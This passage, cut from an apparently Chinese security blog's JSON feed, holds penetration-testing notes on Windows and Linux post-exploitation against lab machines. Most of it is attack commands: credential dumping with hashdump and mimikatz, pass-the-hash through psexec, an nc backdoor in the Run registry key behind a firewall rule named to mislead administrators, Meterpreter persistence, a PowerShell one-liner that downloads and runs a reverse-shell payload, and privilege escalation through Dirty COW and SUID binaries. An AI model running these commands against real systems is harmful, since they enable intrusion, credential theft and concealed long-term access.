class=\"line\">upload msi.msi c:\\\\Users\\\\test # 部分目录由于权限原因可能上传失败</span><br><span class=\"line\">msiexec &#x2F;quiet &#x2F;qn &#x2F;i msi.msi # &#x2F;quiet&#x3D;安装过程中禁止向用户发送消息 &#x2F;qn&#x3D;不使用图形界面 &#x2F;i&#x3D;安装程序</span><br><span class=\"line\">net localgroup administrators</span><br></pre></td></tr></table></figure>\n<p>执行成功后查看管理员组发现用户已经添加成功</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306173648978.png\" alt=\"image-20210306173648978\"></p>\n<p>注意：<br>\n由于是 msf 生成的 msi 文件，所以默认会被杀毒软件拦截，需要做好免杀。</p>\n<h2 id=\"窃取-hash-及密码哈希传递\"><a class=\"markdownIt-Anchor\" href=\"#窃取-hash-及密码哈希传递\">#</a> 窃取 hash 及密码 &amp; 哈希传递</h2>\n<p>窃取 hash 及密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashdump</span><br><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br></pre></td></tr></table></figure>\n<p>得到的 hash 可以拿去 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbWQ1LmNvbS8=\">https://cmd5.com/</span> 解密一下即是用户密码</p>\n<p>或者 ophrack 进行解密</p>\n<h3 id=\"mimikatz\"><a class=\"markdownIt-Anchor\" href=\"#mimikatz\">#</a> mimikatz</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5:</span><br><span class=\"line\">load mimikatz # 加载 mimikatz 模块</span><br><span class=\"line\">msv # 获取用户和 hash 值</span><br><span class=\"line\">kerberos # 获取内存中的明文密码信息</span><br><span class=\"line\">wdigest # 获取内存中的明文密码信息</span><br><span class=\"line\">mimikatz_command -f a:: # 需要以错误的模块来让正确的模块显示</span><br><span class=\"line\">mimikatz_command -f sekurlsa::searchPasswords # 获取用户密码</span><br><span class=\"line\">mimikatz_command -f samdump::hashes # 执行用户 hash</span><br><span class=\"line\"></span><br><span class=\"line\">msf6：</span><br><span class=\"line\">load kiwi</span><br><span class=\"line\">creds_all</span><br><span class=\"line\">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306174435101.png\" alt=\"image-20210306174435101\"></p>\n<h3 id=\"哈希传递\"><a class=\"markdownIt-Anchor\" href=\"#哈希传递\">#</a> 哈希传递</h3>\n<p>利用 hashdump 得到用户的 hash 后可利用 psexec 模块进行哈希传递攻击。<br>\n使用 psexec 的前提：SMB 服务必须开启，也就是开启 445 端口；Admin$ 可以访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class=\"line\">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class=\"line\">set LHOST 192.168.183.147</span><br><span class=\"line\">set LPORT 443</span><br><span class=\"line\">set RHOST 192.168.183.154</span><br><span class=\"line\">set SMBUSER Administrator</span><br><span class=\"line\">set SMBPASS ccf**4ee:3db**678</span><br><span class=\"line\">set SMBDOMAIN WORKGROUP # 域用户需要设置 SMBDOMAIN</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h2 id=\"rdp\"><a class=\"markdownIt-Anchor\" href=\"#rdp\">#</a> RDP</h2>\n<h3 id=\"getgui-命令\"><a class=\"markdownIt-Anchor\" href=\"#getgui-命令\">#</a> getgui 命令</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run getgui –h # 查看帮助</span><br><span class=\"line\">run getgui -e # 开启远程桌面</span><br><span class=\"line\">run getgui -u admin -p admin # 添加用户</span><br><span class=\"line\">run getgui -f 6666 -e # 3389 端口转发到 6666</span><br><span class=\"line\">rdesktop 127.0.0.1:6666</span><br></pre></td></tr></table></figure>\n<h3 id=\"enable_rdp-脚本\"><a class=\"markdownIt-Anchor\" href=\"#enable_rdp-脚本\">#</a> enable_rdp 脚本</h3>\n<p>通过 enable_rdp 脚本将用户添加到远程桌面用户组和管理员用户组</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启远程桌面</span><br><span class=\"line\">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;admin PASSWORD&#x3D;admin # 添加用户</span><br><span class=\"line\">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6667 # 将 3389 端口转发到 666</span><br></pre></td></tr></table></figure>\n<h3 id=\"远程桌面\"><a class=\"markdownIt-Anchor\" href=\"#远程桌面\">#</a> 远程桌面</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">enumdesktops # 查看可用的桌面</span><br><span class=\"line\">getdesktop # 获取当前 meterpreter 关联的桌面</span><br><span class=\"line\">setdesktop # 设置 meterpreter 关联的桌面 -h 查看帮助</span><br><span class=\"line\">run vnc # 使用 vnc 远程桌面连接</span><br><span class=\"line\">rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接</span><br><span class=\"line\">rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码</span><br></pre></td></tr></table></figure>\n<h2 id=\"注册表操作\"><a class=\"markdownIt-Anchor\" href=\"#注册表操作\">#</a> 注册表操作</h2>\n<p>注册表基本命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg –h # 查看帮助</span><br><span class=\"line\">-k 注册表的路径 -v 键的名称 -d 键值</span><br><span class=\"line\">reg enumkey [-k &lt;key&gt;] # 枚举注册表的内容</span><br><span class=\"line\">reg createkey [-k &lt;key&gt;] # 创建注册表项</span><br><span class=\"line\">reg deletekey [-k &lt;key&gt;] # 删除注册表项</span><br><span class=\"line\">reg setval [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;] # 在注册表里添加内容</span><br><span class=\"line\">reg deleteval [-k &lt;key&gt; -v &lt;val&gt;] # 删除注册表的值</span><br><span class=\"line\">reg queryval [-k &lt;key&gt; -v &lt;val&gt;] # 查询注册表的值</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用注册表添加-nc-后门\"><a class=\"markdownIt-Anchor\" href=\"#利用注册表添加-nc-后门\">#</a> 利用注册表添加 nc 后门</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upload &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe C:\\\\windows\\\\system32 # 上传 nc 到目标主机</span><br><span class=\"line\">reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run # 枚举注册表 run 下的键值</span><br><span class=\"line\">reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v test_nc -d &#39;C:\\windows\\system32\\nc.exe -Ldp 443</span><br><span class=\"line\">-e cmd.exe&#39; # 设置键值 -v 键的名称 -d 键值</span><br><span class=\"line\">reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\Run -v test_nc # 查看 test_nc 的键值</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306175106706.png\" alt=\"image-20210306175106706\"></p>\n<p>2. 设置防火墙允许通过 443 端口（如果目标主机开启防火墙，没有设置相应的规则可能会导致连接失败。）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell</span><br><span class=\"line\">netsh firewall show opmode # 查看防火墙状态</span><br><span class=\"line\">netsh firewall add portopening TCP 443 &quot;网络发现(Pub PSD-Out)&quot; ENABLE ALL # 添加防火墙的规则允许 443 端口通过(这里“网络发现</span><br><span class=\"line\">(Pub PSD-Out)”是规则名称，目的是为了迷惑管理员。)</span><br></pre></td></tr></table></figure>\n<p>3. 待目标主机重启后，自启 nc 程序，然后我们利用 nc 连接即</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306175148419.png\" alt=\"image-20210306175148419\"></p>\n<h2 id=\"后门植入\"><a class=\"markdownIt-Anchor\" href=\"#后门植入\">#</a> 后门植入</h2>\n<p>在我们通过漏洞获取到目标主机权限之后，如果目标主机主机重启亦或是管理员发现并修补了漏洞，那么我们就会失去对服务器的控制权，所以我们需要通过植入后门来维持权限，前面说的 nc 后门就是其中一种，另外一般还有 Persistence 和 Metsvc</p>\n<h3 id=\"persistence通过启动项安装\"><a class=\"markdownIt-Anchor\" href=\"#persistence通过启动项安装\">#</a> Persistence (通过启动项安装)</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run persistence –h # 查看帮助</span><br><span class=\"line\">run persistence -X -i 5 -p 3333 -r 本地IP</span><br><span class=\"line\">run persistence -U -i 5 -p 3333 -r 本地IP -L c:\\\\Windows\\\\System32</span><br><span class=\"line\">-X：设置后门在系统启动后自启动。该方式会在 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 下添加注册表信息。由于权限原因会导</span><br><span class=\"line\">致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数</span><br><span class=\"line\">-U：设置后门在用户登录后自启动。该方式会在 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 下添加注册表信息</span><br><span class=\"line\">-L：后门传到远程主机的位置默认为%TEMP%</span><br><span class=\"line\">-i：设置反向连接间隔时间为 5 秒</span><br><span class=\"line\">-p：设置反向连接的端口号</span><br><span class=\"line\">-r：设置反向连接的 ip 地址</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306180420630.png\" alt=\"image-20210306180420630\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306180507815.png\" alt=\"image-20210306180507815\"></p>\n<p>靶机被成功植入后门</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306181305480.png\" alt=\"image-20210306181305480\"></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">backgroup</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost <span class=\"number\">172</span>.<span class=\"number\">16</span>.<span class=\"number\">10</span>.<span class=\"number\">197</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> lport <span class=\"number\">4444</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> paylod windows/meterpreter/reverse_tcp</span><br><span class=\"line\">exploit 成功获得shell</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306180717910.png\" alt=\"image-20210306180717910\"></p>\n<h3 id=\"metsvc通过服务安装一句话需要权限\"><a class=\"markdownIt-Anchor\" href=\"#metsvc通过服务安装一句话需要权限\">#</a> Metsvc (通过服务安装) 一句话需要权限</h3>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run metsvc -h # 查看帮助</span><br><span class=\"line\">run metsvc -A # 自动安装后门</span><br><span class=\"line\">run metsvc -r # 删除后门</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">连接后门</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/metsvc_bind_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> rhost <span class=\"number\">192</span>.<span class=\"number\">168</span>.<span class=\"number\">183</span>.<span class=\"number\">169</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> lport <span class=\"number\">31337</span></span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h3 id=\"powershell-后门\"><a class=\"markdownIt-Anchor\" href=\"#powershell-后门\">#</a> Powershell 后门</h3>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/multi/script/web_delivery</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> LHOST <span class=\"number\">192</span>.<span class=\"number\">168</span>.<span class=\"number\">183</span>.<span class=\"number\">147</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> LPORT <span class=\"number\">2334</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> srvport <span class=\"number\">2333</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> uripath /</span><br><span class=\"line\"><span class=\"built_in\">set</span> target <span class=\"number\">5</span></span><br><span class=\"line\">run</span><br><span class=\"line\">在目标设备 <span class=\"built_in\">cmd</span> 上执行以下命令即可反弹</span><br><span class=\"line\">powershell.exe -nop -w hidden -c $z=&quot;<span class=\"built_in\">echo</span> ($env:temp+&#x27;\\eJedcsJE.exe&#x27;)&quot;; (new-object</span><br><span class=\"line\">System.<span class=\"built_in\">Net</span>.WebClient).DownloadFile(&#x27;http://<span class=\"number\">192</span>.<span class=\"number\">168</span>.<span class=\"number\">183</span>.<span class=\"number\">147</span>:<span class=\"number\">2333</span>/&#x27;, $z); invoke-item $z</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "meterpreter学习笔记"
            ]
        },
        {
            "id": "http://chungod.github.io/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/",
            "url": "http://chungod.github.io/2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/",
            "title": "Windows内核提权",
            "date_published": "2021-04-15T16:00:00.000Z",
            "content_html": "<h2 id=\"windows内核提权\"><a class=\"markdownIt-Anchor\" href=\"#windows内核提权\">#</a> Windows 内核提权</h2>\n<p><strong>Cve-2016-7269 低权限提权</strong></p>\n<p>第一种方法</p>\n<p>利用模块进行渗透</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit&#x2F;windows&#x2F;iis&#x2F;cve-2017-7269</span><br><span class=\"line\">set rhosts IP</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320163403824.png\" alt=\"image-20210320163403824\"></p>\n<p>发现是 windows 低权限，限免进行提权</p>\n<h3 id=\"生成exe上传反弹木马\"><a class=\"markdownIt-Anchor\" href=\"#生成exe上传反弹木马\">#</a> 生成 exe 上传反弹木马</h3>\n<p>生成反弹木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfpc windows 本地IP 3333</span><br><span class=\"line\">mv windows-*.exe 1.exe</span><br><span class=\"line\">msfconsole -r windows-*exe.rc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320163757983.png\" alt=\"image-20210320172549963\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320163555815.png\" alt=\"image-20210320163555815\"></p>\n<p>上传 1.exe 到 C:/1 / 下，进行反弹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execute -f 1.exe</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320163856952.png\" alt=\"image-20210320163856952\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320163912440.png\" alt=\"image-20210320163757983\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester 查看可利用模块</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320165555084.png\" alt=\"image-20210320164413649\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320164413649.png\" alt=\"image-20210320165533159\"></p>\n<p>获得最高 shell</p>\n<h2 id=\"扩展方法\"><a class=\"markdownIt-Anchor\" href=\"#扩展方法\">#</a> 扩展方法</h2>\n<h3 id=\"令牌提权\"><a class=\"markdownIt-Anchor\" href=\"#令牌提权\">#</a> 令牌提权</h3>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320171633846.png\" alt=\"image-20210320171633846\"></p>\n<p>低权限令牌提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use incognito # 加载窃取令牌模块</span><br><span class=\"line\">list_tokens -u # 查看可用的用户令牌</span><br><span class=\"line\">list_tokens -g # 查看可用的用户组令牌</span><br><span class=\"line\">impersonate_token &#39;NT AUTHORITY\\SYSTEM&#39; # 假冒 SYSTEM token</span><br><span class=\"line\">rev2self #返回原始 token</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210320172549963.png\" alt=\"image-20210320165555084\"></p>\n",
            "tags": [
                "Windows内核提权"
            ]
        },
        {
            "id": "http://chungod.github.io/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/",
            "url": "http://chungod.github.io/2021/04/10/linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/",
            "title": "Linux提权",
            "date_published": "2021-04-10T02:24:41.000Z",
            "content_html": "<h2 id=\"linux提权笔记\"><a class=\"markdownIt-Anchor\" href=\"#linux提权笔记\">#</a> linux 提权笔记</h2>\n<h4 id=\"利用内核漏洞提权\"><a class=\"markdownIt-Anchor\" href=\"#利用内核漏洞提权\">#</a>  <code>利用内核漏洞提权</code></h4>\n<p>先开启一个可以交互的终端</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class=\"line\">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br><span class=\"line\">&#x2F;bin&#x2F;bash -i</span><br><span class=\"line\">echo os.system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br></pre></td></tr></table></figure>\n<p>发现靶机是低权限</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409090920475.png\" alt=\"image-20210409090920475\"></p>\n<p>查看靶机内核，发现其版本为 Ubuntu 14.04.</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091109670.png\" alt=\"image-20210409091109670\"></p>\n<p>打开 kali 查询可利用的 exploit，将其下载</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091229671.png\" alt=\"image-20210409091229671\"></p>\n<p>利用 python 将其传递到靶机上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 8081</span><br><span class=\"line\">python -m SimpleHTTPServer 8081</span><br><span class=\"line\">靶机：wget http:&#x2F;&#x2F;IP:8081&#x2F;37292.c</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091411379.png\" alt=\"image-20210409091411379\"></p>\n<p>将 exp 进行编译执行，成功获得 root 权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o 37292.c 37292</span><br><span class=\"line\">.&#x2F;37292</span><br></pre></td></tr></table></figure>\n<h4 id=\"利用旧版本nmap提权\"><a class=\"markdownIt-Anchor\" href=\"#利用旧版本nmap提权\">#</a>  <code>利用旧版本nmap提权</code></h4>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409095550386.png\" alt=\"image-20210409091614007\"></p>\n<p>nmap 支持 “interactive.” 选项，用户能够通过该选项执行 shell 命令，通常，安全人员会使用该命令来避免他们使用 nmap 命令被记录在 history 文件中</p>\n<p>查看可利用的提权 find /-perm -u=s 2&gt;/dev/null</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409095637576.png\" alt=\"image-20210409095550386\"></p>\n<p>发现 nmap 存在提权漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用nmap --interactive </span><br><span class=\"line\">!sh\t成功提权</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409091614007.png\" alt=\"image-20210409095637576\"></strong></p>\n<h4 id=\"环境变量提权\"><a class=\"markdownIt-Anchor\" href=\"#环境变量提权\">#</a>  <code>环境变量提权</code></h4>\n<p>利用普通用户找到可执行文件，进行提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409102649196.png\" alt=\"image-20210122091212588\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210409102540192.png\" alt=\"image-20210409102649196\"></p>\n<h4 id=\"脏牛提权\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权\">#</a>  <code>脏牛提权</code></h4>\n<p>使用 <code>uname -a</code>  命令查看 linux 内核信息，发现在脏牛漏洞范围内，可以进行测试。</p>\n<p>(需要 root 用户存在可执行文件)</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210122091212588.png\" alt=\"image-20210409102540192\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">searchsploit dirty</span><br><span class=\"line\">searchsploit -m 40839.c</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210122091605012.png\" alt=\"image-20210410094828540\"></p>\n<p>3. 将 exp 一下载到本地，使用 gcc -pthread dirty.c -o dirty -lcrypt` 命令对 dirty.c 进行编译，生成一个 dirty 的可执行文件。</p>\n<figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 777 40839.c</span><br><span class=\"line\">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class=\"line\">./40839</span><br><span class=\"line\">等一会passwd文件会生成一个firefart用户</span><br><span class=\"line\">su firefart (输入之前的密码,成功提权)</span><br></pre></td></tr></table></figure>\n<h4 id=\"find提权\"><a class=\"markdownIt-Anchor\" href=\"#find提权\">#</a>  <code>find提权</code></h4>\n<p>(DC-01)</p>\n<p>先查找拥有 suid 权限的文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410094828540.png\" alt=\"image-20210410095644313\"></p>\n<p>进行提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch test.txt</span><br><span class=\"line\">find &#x2F; -type f -name test.txt -exec &quot;whoami&quot; \\; 发现是root权限</span><br><span class=\"line\">find &#x2F; -type f -name test.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \\; 成功提权</span><br></pre></td></tr></table></figure>\n<h4 id=\"git提权\"><a class=\"markdownIt-Anchor\" href=\"#git提权\">#</a>  <code>git提权</code></h4>\n<p>(DC-02)</p>\n<p>寻找可用提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410095644313.png\" alt=\"image-20210122091605012\"></p>\n<p>绕过 rbash 进行提权</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410093833321.png\" alt=\"image-20210410100730655\"></p>\n<p>可用命令有 less、ls、scp、vi，绕过可用如下方法：</p>\n<ul>\n<li>可使用 less 绕过：$less test  然后！‘sh’</li>\n<li>使用 ls 绕过：$man ls  然后！‘sh’</li>\n<li>使用 vi 绕过：$vi test  然后:!/bin/sh 或者 :!/bin/bash</li>\n</ul>\n<p>还可以用 BASH_CMDS [a]=/bin/sh;a 直接绕过</p>\n<p>或者更改环境变量，并查看 flag3.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a  注：把&#x2F;bin&#x2F;bash给a变量&#96;</span><br><span class=\"line\">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;    注：将&#x2F;bin 作为PATH环境变量导出</span><br><span class=\"line\">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin   注：将&#x2F;usr&#x2F;bin作为PATH环境变量导出</span><br></pre></td></tr></table></figure>\n<p><strong>尝试 git 提权</strong>：可使用 sudo git help config 或者 sudo git -p help</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410093844939.png\" alt=\"image-20210410093833321\"></p>\n<h4 id=\"sudo提权\"><a class=\"markdownIt-Anchor\" href=\"#sudo提权\">#</a>  <code>sudo提权</code></h4>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果知道用户为空密码可以尝试sudo提权</span><br><span class=\"line\">sudo -l， sudo 